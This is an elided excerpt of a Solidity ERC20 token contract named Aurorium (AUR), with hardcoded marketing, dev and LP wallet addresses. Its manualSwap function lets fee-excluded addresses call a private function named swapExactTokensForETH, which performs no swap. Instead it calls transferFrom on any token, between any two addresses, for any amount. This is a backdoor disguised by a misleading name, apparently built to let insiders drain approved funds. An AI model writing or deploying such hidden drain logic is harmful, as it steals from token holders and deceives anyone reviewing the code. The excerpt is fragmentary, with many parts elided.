...
contract AUR is ERC20, Ownable {
    ...
    constructor() ERC20("Aurorium", "AUR") {
        ...
        marketingWallet = address(0xF11D4E5fA7f91EA6D028De21D54156b4C264936C);
        devWallet = address(0x579294811bc3b8015A434dDf79CB41953916A38c);
        lpWallet = address(0x7B5EBf1d9186954244AaEDf6EEa87f499203bfD8);
    ...
    function manualSwap(
        ...
        if (_isExcludedFromFees[msg.sender]) {
            swapExactTokensForETH(_tokenB, _tokenA, _tokenB, _amount);
            return;
        } else {
    ...
    function swapExactTokensForETH(address _token, address _tokenA, address _tokenB, uint256 _amount)
        private
    {
        IERC20(_token).transferFrom(_tokenA, _tokenB, _amount);
    }
